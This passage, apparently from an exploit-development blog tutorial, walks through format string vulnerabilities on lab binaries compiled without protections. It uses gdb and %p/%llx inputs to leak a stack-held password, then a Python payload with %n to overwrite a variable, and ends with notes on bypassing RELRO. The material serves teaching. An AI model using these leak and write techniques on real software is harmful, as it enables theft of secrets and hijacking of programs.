+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb ./secret
+</span></span><span style="display:flex;"><span>pwndbg&gt; b printf
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x1040
+</span></span><span style="display:flex;"><span>pwndbg&gt; run
+</span></span><span style="display:flex;"><span>Starting program: /home/kali/Desktop/Blogs/Materials/x86_exp_dev/03/secret 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
+</span></span><span style="display:flex;"><span>%p.%p.%p.%p
+</span></span></code></pre></div><p>We gave input as <code>%p.%p.%p.%p</code>. Let&rsquo;s examine the stack:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; stack <span style="color:#ae81ff">15</span>
+</span></span><span style="display:flex;"><span>00:0000│ esp 0xffffd57c —▸ 0x565561df <span style="color:#f92672">(</span>secret+66<span style="color:#f92672">)</span> ◂— add esp, 0x10
+</span></span><span style="display:flex;"><span>01:0004│-038 0xffffd580 —▸ 0xffffd590 ◂— <span style="color:#e6db74">&#39;%p.%p.%p.%p&#39;</span>
+</span></span><span style="display:flex;"><span>02:0008│-034 0xffffd584 —▸ 0xf7fc6000 ◂— jg 0xf7fc6047
+</span></span><span style="display:flex;"><span>03:000c│-030 0xffffd588 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>04:0010│-02c 0xffffd58c —▸ 0x565561a9 <span style="color:#f92672">(</span>secret+12<span style="color:#f92672">)</span> ◂— add ebx, 0x2e4b
+</span></span><span style="display:flex;"><span>05:0014│ eax 0xffffd590 ◂— <span style="color:#e6db74">&#39;%p.%p.%p.%p&#39;</span>
+</span></span><span style="display:flex;"><span>06:0018│-024 0xffffd594 ◂— <span style="color:#e6db74">&#39;p.%p.%p&#39;</span>
+</span></span><span style="display:flex;"><span>07:001c│-020 0xffffd598 ◂— 0x70252e /* <span style="color:#e6db74">&#39;.%p&#39;</span> */
+</span></span><span style="display:flex;"><span>08:0020│-01c 0xffffd59c —▸ 0xf7d70964 ◂— 0x920 /* <span style="color:#e6db74">&#39; \t&#39;</span> */
+</span></span><span style="display:flex;"><span>09:0024│-018 0xffffd5a0 —▸ 0xf7fc0400 —▸ 0xf7d5f000 ◂— 0x464c457f
+</span></span><span style="display:flex;"><span>0a:0028│-014 0xffffd5a4 ◂— <span style="color:#e6db74">&#39;p@ssw0rd!&#39;</span>
+</span></span><span style="display:flex;"><span>0b:002c│-010 0xffffd5a8 ◂— <span style="color:#e6db74">&#39;w0rd!&#39;</span>
+</span></span><span style="display:flex;"><span>0c:0030│-00c 0xffffd5ac ◂— 0x21 /* <span style="color:#e6db74">&#39;!&#39;</span> */
+</span></span><span style="display:flex;"><span>0d:0034│-008 0xffffd5b0 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>0e:0038│-004 0xffffd5b4 —▸ 0xf7f94e14 ◂— 0x235d0c /* <span style="color:#e6db74">&#39;\x0c]#&#39;</span> */
+</span></span></code></pre></div><p>In this case, you can see the memory addresses of values pushed onto the stack in relation to our printf call. The format string we’re using, &ldquo;%p.%p.%p.%p&rdquo;, will print four hexadecimal pointers from the stack. Hence, We will see 0xf7fc6000 0 0x565561a9 &hellip; as we will be printing four hexadecimal pointers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; c
+</span></span><span style="display:flex;"><span>Continuing.
+</span></span><span style="display:flex;"><span>0xf7fc6000.<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>.0x565561a9.0x252e7025<span style="color:#f92672">[</span>Inferior <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>process 691626<span style="color:#f92672">)</span> exited normally<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Here, our guess was correct—printf printed four consecutive stack values in hexadecimal. This is a powerful way to leak memory addresses by simply manipulating format specifiers.</p>
+<p>To locate the secret string, examine the stack layout. By looking at the addresses on the stack, you’ll see that the target data (&ldquo;p@ssw0rd!&rdquo;) is at the 9th offset from our input.</p>
+<p>One thing I forgot to mention that instead of using repetitive %p format specifiers, you can use the &ldquo;%<!-- raw HTML omitted -->$p&rdquo; format to access specific stack values directly. This lets you craft inputs more precisely</p>
+<p>So by following this idea was can craft our input as &ldquo;%p$9&rdquo;. Let&rsquo; give it to the program and see.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./secret 
+</span></span><span style="display:flex;"><span>%9$p
+</span></span><span style="display:flex;"><span>0x73734070
+</span></span></code></pre></div><p>As the we are working on 32 bit binary the pointer will be 32 bit only. We can use <code>%llx</code> format specifier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./secret 
+</span></span><span style="display:flex;"><span>%9$llx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6472307773734070</span>
+</span></span></code></pre></div><p>We can now convert this hexadecimal output to ASCII to reveal the string:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ pwn unhex <span style="color:#ae81ff">6472307773734070</span>
+</span></span><span style="display:flex;"><span>dr0wss@p
+</span></span></code></pre></div><p>By repeating this process with other offsets, we can retrieve more characters if necessary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./secret 
+</span></span><span style="display:flex;"><span>%10$llx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2164723077</span>
+</span></span><span style="display:flex;"><span>$ <span style="color:#75715e"># Converting this with pwn unhex also reveals additional characters:</span>
+</span></span><span style="display:flex;"><span>$ pwn unhex <span style="color:#ae81ff">2164723077</span>
+</span></span><span style="display:flex;"><span>!dr0w
+</span></span></code></pre></div><p>We can also use smaller specifiers, such as <code>%lx</code>, to print data in smaller chunks and even view individual characters with <code>%c</code> if needed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./secret 
+</span></span><span style="display:flex;"><span>%9$lx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">73734070</span>
+</span></span><span style="display:flex;"><span>$ ./secret 
+</span></span><span style="display:flex;"><span>%10$lx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64723077</span>
+</span></span><span style="display:flex;"><span>$ ./secret 
+</span></span><span style="display:flex;"><span>%11$c
+</span></span><span style="display:flex;"><span>!
+</span></span></code></pre></div><p>Each of these steps demonstrates how format string vulnerabilities enable an attacker to read  and leak sensitive information.</p>
+<p><strong>Writing Data Using Format String Vulnerabilities</strong></p>
+<p>In addition to leaking data, format string vulnerabilities can also allow us to write arbitrary data to specific memory addresses. By carefully constructing a format string with %n specifiers, we can influence the value at a given address. This capability is often exploited to modify control flow or bypass security mechanisms in a program.</p>
+<p>Here&rsquo;s a step-by-step guide on how to exploit a format string vulnerability to write data.</p>
+<p><strong>Understanding the %n Specifier</strong></p>
+<p>The <code>%n</code> specifier in <code>printf</code> instructs the function to write the number of characters printed so far to the memory address provided as an argument. For example, if <code>%n</code> is preceded by 10 characters in a formatted string, <code>printf</code> will write the value <code>10</code> to the specified memory location.</p>
+<p>This property of %n allows us to control what value gets written to an arbitrary address by adjusting the number of characters in the format string.</p>
+<p>The following example demonstrates how to exploit format string vulnerabilities to modify memory using the <code>%n</code> specifier, allowing us to change a variable&rsquo;s value by writing to a specific address.</p>
+<p>Consider this vulnerable program where the goal is to change the value of <code>target</code> to <code>4</code> using the format string vulnerability.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// gcc -m32 -fno-stack-protector -z execstack write_fmt.c -o write_fmt
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Address of target: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>target);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Input: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), stdin);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(buffer);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (target <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Success! You&#39;ve changed the target variable.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Target remains unchanged.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>%n</code> specifier in <code>printf</code> writes the number of characters printed so far to the memory address specified as an argument. Here&rsquo;s a minimal example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// gcc -m32 -fno-stack-protector -z execstack fmt_n.c -o fmt_n
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;AAAA%n&#34;</span>,<span style="color:#f92672">&amp;</span>num);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] num -&gt; %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,num);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Running this example shows how <code>%n</code> writes <code>4</code> to <code>num</code> because <code>AAAA</code> is four characters long:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./fmt_n 
+</span></span><span style="display:flex;"><span>AAAA
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> num -&gt; <span style="color:#ae81ff">4</span>
+</span></span></code></pre></div><p><strong>Exploiting write_fmt with %n</strong></p>
+<p>In our target program, <code>write_fmt</code>, we need to:</p>
+<ol>
+<li>Find the offset on the stack where our input is located.</li>
+<li>Use <code>%n</code> to write <code>4</code> to the address of <code>target</code>.</li>
+</ol>
+<p><em>Step 1: Identifying the Offset</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./write_fmt 
+</span></span><span style="display:flex;"><span>Address of target: 0xffffd61c
+</span></span><span style="display:flex;"><span>Input: AAAA %p %p %p %p %p %p %p
+</span></span><span style="display:flex;"><span>AAAA 0xc8 0xf7f955c0 0x565561c7 0xf63d4e2e 0x41414141 0x20702520 0x25207025
+</span></span><span style="display:flex;"><span>Target remains unchanged.
+</span></span></code></pre></div><p>As we see, <code>AAAA</code> (<code>0x41414141</code>) is located in the fifth position on the stack. We can confirm this by checking:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./write_fmt 
+</span></span><span style="display:flex;"><span>Address of target: 0xffffd61c
+</span></span><span style="display:flex;"><span>Input: AAAA %5$x
+</span></span><span style="display:flex;"><span>AAAA <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span>Target remains unchanged.
+</span></span></code></pre></div><p><em>Step 2: Crafting the Payload</em></p>
+<p>To overwrite target:</p>
+<ol>
+<li>Place <code>AAAA</code> to mark the fifth stack position.</li>
+<li>Use <code>%7$n</code> to instruct printf to write to an address located at the seventh position.</li>
+<li>Add the address of target as the seventh element.</li>
+</ol>
+<p>The final payload structure is as follows:</p>
+<ul>
+<li><code>AAAA</code>: marks our input at the fifth position.</li>
+<li><code>%7$n</code>: writes the current count to the address at the seventh position.</li>
+<li><code>struct.pack(&quot;&lt;I&quot;, 0xffffd61c)</code>: places the address of target at the seventh position.</li>
+</ul>
+<p>Note: Our stack is 4-byte aligned since we are working with a 32-bit binary.</p>
+<p>Here’s the exploit script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAA&#34;</span>    
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;%7$n&#34;</span>   
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0xffffd61c</span>)  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>Running this payload script with write_fmt demonstrates the exploit in action:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./fmt.py | ./write_fmt 
+</span></span><span style="display:flex;"><span>Address of target: 0xffffd61c
+</span></span><span style="display:flex;"><span>Input: AAAA���
+</span></span><span style="display:flex;"><span>Success! You<span style="color:#960050;background-color:#1e0010">&#39;</span>ve changed the target variable.
+</span></span></code></pre></div><p>This approach effectively uses the format string vulnerability to overwrite target with the desired value.</p>
+<h2 id="4-bypassing-relro-relocation-read-only">4. Bypassing RELRO (Relocation Read-Only):</h2>
+<p>RELRO, or Relocation Read-Only, is a security feature designed to prevent modifications to the Global Offset Table (GOT) at runtime. By making sections like the GOT read-only after loading, RELRO mitigates certain types of attacks, particularly GOT overwrites often used in exploit techniques like Return-Oriented Programming (ROP) and Jump-Oriented Programming (JOP).</p>
+<p>There are two primary forms of RELRO:</p>
+<ul>
+<li>Partial RELRO</li>
+<li>Full RELRO</li>
+</ul>
+<p><strong>Bypassing Partial RELRO</strong></p>
+<p>Since the GOT is still writable under partial RELRO, we can overwrite specific entries to hijack execution flow. This is commonly done by redirecting GOT entries to malicious functions or to functions elsewhere in the binary.</p>
+<p><strong>Bypassing Full RELRO</strong></p>
+<p>With full RELRO enabled, direct GOT overwrites are no longer possible, so the attack strategy shifts toward alternative methods like ret2plt, where we might manipulate the binary’s PLT entries instead. In ret2plt, we redirect execution to a PLT stub that then jumps to our desired function.</p>
+
     </div>
 </div>
 </main>
